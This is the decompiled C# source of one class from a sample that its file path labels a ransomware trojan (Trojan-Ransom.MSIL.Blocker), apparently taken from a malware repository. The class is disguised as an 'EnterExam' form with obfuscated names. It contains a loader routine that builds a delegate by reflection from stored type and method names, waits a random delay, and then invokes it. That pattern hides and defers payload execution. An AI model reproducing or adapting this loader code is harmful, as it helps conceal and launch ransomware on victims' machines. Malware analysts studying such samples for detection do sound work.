// Decompiled with JetBrains decompiler
// Type: Fz72.Ej4x
// Assembly: Kw9, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 454AB7CE-9D73-4F30-B915-379BCB1A28FE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0427c1890b6afe33b5647e2a756353d61092f9e0631bcb8cc3109a25a81f5068.exe

using Jn4q;
using Microsoft.VisualBasic.CompilerServices;
using n7G5;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Fz72
{
  [DesignerGenerated]
  public class Ej4x : Form
  {
    private IContainer components;

    public Ej4x() => this.Qy4m();

    [DebuggerNonUserCode]
    protected virtual void To2i(bool c6P3)
    {
      try
      {
        if (!c6P3 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(c6P3);
      }
    }

    [DebuggerStepThrough]
    private void Qy4m()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = "EnterExam";
      this.Text = "EnterExam";
      this.ResumeLayout(false);
    }

    internal static byte[] Wc60(int e5AC, int p6Y3)
    {
      if (e5AC <= 0)
        return (byte[]) null;
      int[] Ge68 = new int[checked (p6Y3 + 1)];
      int num1 = p6Y3;
      int index = 0;
      while (index <= num1)
      {
        int num2 = checked (e5AC * index);
        if (num2 > (int) byte.MaxValue)
          num2 = (int) byte.MaxValue;
        Ge68[index] = num2;
        checked { ++index; }
      }
      return Ts0z.j7QF(Ge68, p6Y3);
    }

    internal static void Zo8a()
    {
      Gt9k.mDic.Add("lol", (object) typeof (Gt9k.k6ZC));
      Delegate @delegate = Delegate.CreateDelegate(typeof (Gt9k.k6ZC), (System.Type) Gt9k.mDic[Gt9k.T], Conversions.ToString(Gt9k.mDic[Gt9k.mName]), false, true);
      Gt9k.mDic.Add("lol2", (object) @delegate);
      Task.Delay(new Random().Next(1000, 5000)).Wait();
      if (Gt9k.mDic["lol2"] == null)
        return;
      ((Gt9k.k6ZC) Gt9k.mDic["lol2"])();
    }

    static void Rr42()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Bc94()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
